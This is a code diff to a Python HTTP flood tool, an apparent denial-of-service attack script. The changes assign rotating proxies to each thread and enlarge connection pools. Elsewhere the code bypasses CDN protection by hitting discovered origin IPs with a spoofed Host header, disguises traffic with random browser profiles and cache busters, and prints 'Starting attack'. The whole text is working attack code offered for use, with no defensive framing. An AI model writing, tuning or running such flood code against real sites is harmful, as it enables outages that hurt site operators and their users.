@@ -310,63 +310,58 @@ class HTTPFlood:
         if self.use_origin and self.domain:
             self.origin_ips = discover_origin_ips(self.domain)
         
+        if config.proxies:
+            self.thread_proxies = []
+            for i in range(self.threads):
+                proxy = config.proxies[i % len(config.proxies)]
+                self.thread_proxies.append({'http': proxy, 'https': proxy})
+            print(f"[*] Assigned {len(self.thread_proxies)} proxies to threads")
+        else:
+            self.thread_proxies = None
+        
         config.stats['start_time'] = time.time()
         self.running = True
         
-    def worker(self):
+    def worker(self, thread_id=0):
         """Worker thread for sending requests"""
         session = requests.Session()
         session.verify = False
         
         adapter = requests.adapters.HTTPAdapter(
-            pool_connections=10,
-            pool_maxsize=20,
+            pool_connections=20,
+            pool_maxsize=50,
             max_retries=0,
             pool_block=False
         )
         session.mount('http://', adapter)
         session.mount('https://', adapter)
         
+        if self.thread_proxies:
+            session.proxies = self.thread_proxies[thread_id % len(self.thread_proxies)]
+        
         import warnings
         warnings.filterwarnings('ignore', message='Unverified HTTPS request')
         
         end_time = time.time() + self.duration
         local_count = 0
-        current_proxy = None
-        proxy_fails = 0
-        requests_with_proxy = 0
         
         while self.running and time.time() < end_time:
             try:
-                if config.proxies and (current_proxy is None or proxy_fails >= 5 or requests_with_proxy >= 50):
-                    current_proxy = get_proxy()
-                    if current_proxy:
-                        session.proxies = current_proxy
-                        proxy_fails = 0
-                        requests_with_proxy = 0
-                    else:
-                        if config.debug:
-                            print("[DEBUG] No working proxies available")
-                        time.sleep(0.5)
-                        continue
-                
                 profile = random.choice(BROWSER_PROFILES)
                 headers = get_advanced_headers(self.url, referer=self.url, profile=profile)
                 
                 target_url = self.url
-                use_http = False
                 if self.origin_ips and self.use_origin:
                     origin_ip = random.choice(self.origin_ips)
                     if origin_ip != self.domain:
                         target_url = self.url.replace('https://', 'http://').replace(self.domain, origin_ip)
-                        use_http = True
                         headers['Host'] = self.domain
                     else:
                         target_url = self.url
                 
                 target_url = add_cache_buster(target_url)
                 
-                timeout = 3 if config.proxies else 2
+                timeout = 2
                 
                 if self.method == 'GET':
                     response = session.get(target_url, headers=headers, timeout=timeout, allow_redirects=False)
@@ -383,43 +378,22 @@ class HTTPFlood:
                     bytes_received=len(response.content)
                 )
                 
-                proxy_fails = 0
                 local_count += 1
-                requests_with_proxy += 1
                 
-                if config.debug and local_count % 10 == 0:
-                    print(f"[DEBUG] Thread {threading.current_thread().name}: {local_count} requests | Status: {response.status_code}")
+                if config.debug and local_count % 100 == 0:
+                    print(f"[DEBUG] Thread-{thread_id}: {local_count} requests | Status: {response.status_code}")
                 
             except (requests.exceptions.SSLError,
-                    requests.exceptions.ProxyError) as e:
-                update_stats(success=False)
-                proxy_fails += 1
-                
-                if current_proxy and proxy_fails >= 5:
-                    mark_proxy_bad(current_proxy)
-                    if config.debug:
-                        print(f"[DEBUG] Marked proxy as bad: {type(e).__name__}")
-                    current_proxy = None
-                    requests_with_proxy = 0
-                
-            except (requests.exceptions.ConnectionError,
+                    requests.exceptions.ProxyError,
+                    requests.exceptions.ConnectionError,
                     requests.exceptions.Timeout,
                     requests.exceptions.ReadTimeout) as e:
                 update_stats(success=False)
-                proxy_fails += 1
-                
-                if config.debug:
-                    print(f"[DEBUG] Connection error: {type(e).__name__}")
-                
-                if current_proxy and proxy_fails >= 8:
-                    mark_proxy_bad(current_proxy)
-                    current_proxy = None
-                    requests_with_proxy = 0
+                if config.debug and local_count % 100 == 0:
+                    print(f"[DEBUG] Thread-{thread_id} error: {type(e).__name__}")
                 
             except Exception as e:
                 update_stats(success=False)
-                if config.debug:
-                    print(f"[DEBUG] Error: {type(e).__name__}: {str(e)[:50]}")
         
         try:
             session.close()
@@ -433,7 +407,7 @@ class HTTPFlood:
         print(f"[*] Starting attack with {self.threads} threads...")
         
         with ThreadPoolExecutor(max_workers=self.threads) as executor:
-            futures = [executor.submit(self.worker) for _ in range(self.threads)]
+            futures = [executor.submit(self.worker, i) for i in range(self.threads)]
             
             last_stats = time.time()
             while self.running and time.time() < config.stats['start_time'] + self.duration:
